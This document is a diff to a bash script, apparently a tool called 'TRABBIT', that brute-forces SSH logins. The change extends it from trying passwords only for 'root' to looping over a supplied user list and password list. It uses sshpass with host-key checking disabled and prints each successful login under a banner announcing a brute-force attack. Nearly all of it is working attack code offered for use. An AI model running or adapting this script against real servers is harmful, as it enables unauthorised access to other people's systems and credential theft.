@@ -4,31 +4,36 @@ clear
 trap 'echo -e "\nOperation aborted by the user."; exit' INT
 
 function test_ssh_password {
-    ssh_command="sshpass -p '$3' ssh -o StrictHostKeyChecking=no -p $2 $1@$4 'echo SSH Login Successful'"
+    ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"
     if output=$(eval "$ssh_command" 2>&1); then
         if [[ $output == *"SSH Login Successful"* ]]; then
-            echo "SSH Login Successful - $1:$3"
+            echo "SSH Login Successful - $1:$2"
         else
-            echo "SSH Login Failed - $1:$3"
+            echo "SSH Login Failed - $1:$2"
         fi
     else
-        echo "SSH Login Failed - $1:$3"
+        echo "SSH Login Failed - $1:$2"
     fi
 }
 
 # Parse command-line arguments
-while getopts ":i:u:p:l:" opt; do
+while getopts ":u:i:p:l:" opt; do
     case $opt in
+        u) userlist_path=$OPTARG ;;
         i) host_ip=$OPTARG ;;
-        u) host_url=$OPTARG ;;
         p) ssh_port=$OPTARG ;;
         l) passwordlist_path=$OPTARG ;;
         \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
     esac
 done
 
-if [[ -z $host_ip && -z $host_url ]]; then
-    echo "Please provide either the -i option for IP address or the -u option for URL."
+if [[ -z $host_ip ]]; then
+    echo "Please provide the IP address using the -i option."
+    exit 1
+fi
+
+if [[ -z $userlist_path ]]; then
+    echo "Please provide the path to the user list using the -u option."
     exit 1
 fi
 
@@ -41,6 +46,7 @@ if [[ -z $ssh_port ]]; then
     ssh_port=22
 fi
 
+IFS=$'\r\n' GLOBIGNORE='*' command eval 'users=($(cat "$userlist_path"))'
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'
 
 echo "   ____ ____ _   _    _    ____ _   _   "
@@ -51,20 +57,23 @@ echo "  \____\____|_| |_/_/   \_\____|_| |_|  "
 echo "                              TRABBIT   "
 echo "======================================="
 
-# Display target, port, and passlist
-echo "--{[+]TARGET} // ${host_url}"
-echo "--{[+]PORT} //  ${ssh_port:-22}"
-echo "--{[+]PASSLIST} // ${passwordlist_path:-}"
-
+# Display target, port, and passlist filenames
+for i in "--{[+]TARGET} => $host_ip" "--{[+]PORT} => ${ssh_port:-22}" "--{[+]USERLIST} => $(basename "$userlist_path")" "--{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
+    sleep 0.2
+    echo "$i"
+done
+sleep 0.2
 echo "======================================="
-echo "//BRUTEFORCE ATTACK STARTED//           "
+echo "//BRUTEFORCE ATTACK STARTED//          "
 echo "======================================="
-echo ""
+for i in {1..39}; do
+    sleep 0.01
+    echo -n "•"
+done
+echo
 
-for password in "${passwords[@]}"; do
-    if [[ -n $host_ip ]]; then
-        test_ssh_password "root" "$ssh_port" "$password" "$host_ip"
-    else
-        test_ssh_password "root" "$ssh_port" "$password" "$host_url"
-    fi
+for user in "${users[@]}"; do
+    for password in "${passwords[@]}"; do
+        test_ssh_password "$user" "$password" "$ssh_port" "$host_ip"
+    done
 done
